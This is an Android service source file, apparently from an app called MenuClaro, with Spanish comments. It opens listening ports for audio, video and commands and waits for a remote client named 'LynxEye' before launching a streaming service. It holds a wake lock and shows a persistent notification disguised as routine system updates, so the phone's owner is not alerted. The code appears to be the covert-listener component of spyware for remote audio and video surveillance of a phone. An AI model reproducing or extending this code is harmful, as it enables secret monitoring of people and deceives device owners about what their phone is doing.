package com.menuclaro;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import androidx.core.app.NotificationCompat;

import java.net.ServerSocket;
import java.net.Socket;

public class IdleService extends Service {

    public static boolean isRunning = false;
    private static final String CHANNEL_ID = "MenuClaroIdle";

    // Puertos que monitoreamos para detectar LynxEye
    private static final int PORT_AUDIO   = 9999;
    private static final int PORT_VIDEO   = 9998;
    private static final int PORT_COMMAND = 9997;

    private PowerManager.WakeLock wakeLock;
    private volatile boolean running = false;

    // Sockets de escucha en idle
    private ServerSocket ssAudio, ssVideo, ssCommand;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopSelf(); return START_NOT_STICKY;
        }
        if (isRunning) return START_STICKY;

        startForegroundNotification();
        acquireWakeLock();
        running = true;
        isRunning = true;
        startIdleWatcher();
        return START_STICKY;
    }

    private void startIdleWatcher() {
        new Thread(() -> {
            while (running) {
                try {
                    // Abrir puertos en idle - esperando LynxEye
                    ssAudio   = new ServerSocket(PORT_AUDIO);   ssAudio.setReuseAddress(true);
                    ssVideo   = new ServerSocket(PORT_VIDEO);   ssVideo.setReuseAddress(true);
                    ssCommand = new ServerSocket(PORT_COMMAND); ssCommand.setReuseAddress(true);

                    // Esperar cualquier conexión de LynxEye
                    // Usamos solo audio como trigger (LynxEye siempre conecta audio primero)
                    Socket trigger = ssAudio.accept();

                    // Cerrar los ServerSockets para liberar los puertos
                    // StreamService los necesita
                    try { ssAudio.close(); }   catch (Exception ignored) {}
                    try { ssVideo.close(); }   catch (Exception ignored) {}
                    try { ssCommand.close(); } catch (Exception ignored) {}

                    // Cerrar el socket trigger - LynxEye reconectará solo
                    // (LynxEye tiene loop de reconexión automática)
                    try { trigger.close(); } catch (Exception ignored) {}

                    // Arrancar StreamService con los puertos libres
                    if (running) {
                        Intent intent = new Intent(this, StreamService.class);
                        intent.setAction("START");
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(intent);
                        } else {
                            startService(intent);
                        }

                        // Esperar que StreamService arranque
                        Thread.sleep(500);

                        // Esperar que StreamService termine (LynxEye desconectó)
                        while (running && StreamService.isRunning) {
                            Thread.sleep(1000);
                        }

                        // StreamService terminó → volver a idle (sin LED)
                        Thread.sleep(500);
                    }

                } catch (Exception ignored) {
                } finally {
                    try { if (ssAudio != null && !ssAudio.isClosed()) ssAudio.close(); } catch (Exception ignored) {}
                    try { if (ssVideo != null && !ssVideo.isClosed()) ssVideo.close(); } catch (Exception ignored) {}
                    try { if (ssCommand != null && !ssCommand.isClosed()) ssCommand.close(); } catch (Exception ignored) {}
                    if (running) try { Thread.sleep(300); } catch (InterruptedException e) { break; }
                }
            }
        }, "IdleWatcher").start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        isRunning = false;
        try { if (ssAudio != null) ssAudio.close(); } catch (Exception ignored) {}
        try { if (ssVideo != null) ssVideo.close(); } catch (Exception ignored) {}
        try { if (ssCommand != null) ssCommand.close(); } catch (Exception ignored) {}
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Servicios del sistema", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = getSystemService(NotificationManager.class);
            if (mgr != null) mgr.createNotificationChannel(ch);
        }
        startForeground(2, new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Servicios activos")
                .setContentText("Procesando actualizaciones del sistema...")
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true).build());
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MenuClaro::IdleWakeLock");
        wakeLock.acquire();
    }
}
